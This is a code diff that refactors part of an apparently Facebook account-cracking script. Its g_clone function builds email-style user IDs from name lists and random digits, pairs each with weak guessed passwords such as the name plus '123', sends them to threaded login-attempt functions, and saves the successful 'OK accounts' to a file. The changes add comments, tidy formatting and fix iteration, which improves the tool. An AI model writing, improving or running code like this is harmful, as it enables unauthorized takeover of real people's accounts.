@@ -931,21 +931,26 @@ def n_clone():
     exit()
 
 def g_clone():
-    user=[]
-    os.system('clear')
+    user = []  # List to store random user IDs
+    os.system('clear')  # Clear the terminal screen
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = ['sumon','abinash','rakesh','riya','ramesh','somnath']
-    last = ['roy','das','sarkar','mondal']
+
+    first = ['sumon', 'abinash', 'rakesh', 'riya', 'ramesh', 'somnath']
+    last = ['roy', 'das', 'sarkar', 'mondal']
     domain = '@gmail.com'
+    
     try:
         limit = int(input(' [:] Crack Limit : '))
     except ValueError:
-        limit = 5000
+        limit = 5000  # Default value if input is invalid
+    
+    # Generate user data (3-digit random numbers)
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(3))
         user.append(nmp)
-    clear()
+    
+    os.system("clear")
     print("                CHOOSE METHOD                       ")
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(" [1] METHOD (METHOD1) ")
@@ -955,8 +960,11 @@ def g_clone():
     print(" [5] METHOD (METHOD5) ")
     print(" [6] METHOD (METHOD6) ")
     linex()
+    
+    # Choose method
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
+    
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
     c = input(" [?] Input : ")
@@ -964,29 +972,43 @@ def g_clone():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
+    
+    # Initialize ThreadPool for multi-threading
     with ThreadPool(max_workers=30) as SUMON_xd:
         tl = str(len(user))
         os.system("clear")
         print(logo)
         print(f'{green}=> BE PATIENT BABY ')
-        print(f'{green}=> TOTAL LIMID : \033[1;32m'+tl)
+        print(f'{green}=> TOTAL LIMIT : \033[1;32m' + tl)
         print(f'{green}=> USE FLIGHT MODE ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-        for love, firs, las in zip(user, first, last):
-            uid = firs+las+love+domain
-            pwx = [firs+las,firs+'12',firs+'123',firs+'1234',firs+'12345']
-            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
-            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
-            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
-            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
-            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
-            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
+        
+        # Use zip_longest to iterate over user, first, and last
+        from itertools import zip_longest
+        for love, firs, las in zip_longest(user, first, last, fillvalue=''):
+            uid = firs + las + love + domain
+            pwx = [firs + las, firs + '12', firs + '123', firs + '1234', firs + '12345']
+            
+            # Submit tasks to thread pool based on chosen method
+            if SUMONfire == '1':
+                SUMON_xd.submit(mbasic, uid, pwx, tl)
+            elif SUMONfire == '2':
+                SUMON_xd.submit(p, uid, pwx, tl)
+            elif SUMONfire == '3':
+                SUMON_xd.submit(x, uid, pwx, tl)
+            elif SUMONfire == '4':
+                SUMON_xd.submit(mobile, uid, pwx, tl)
+            elif SUMONfire == '5':
+                SUMON_xd.submit(freeq, uid, pwx, tl)
+            elif SUMONfire == '6':
+                SUMON_xd.submit(d, uid, pwx, tl)
             else:
-                SUMON_xd.submit(p,uid,pwx,tl)
+                SUMON_xd.submit(p, uid, pwx, tl)
+    
     linex()
-    print('[â] CRACK PROCESS COMPLETE')
-    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('[✔] CRACK PROCESS COMPLETE')
+    print(f'[✔] TOTAL OK ACCOUNTS : {len(oks)}')
+    print('[✔] ID SAVE SUMON-OK TXT')
     linex()
 
 def freefb(uid, name, pwx, tl):
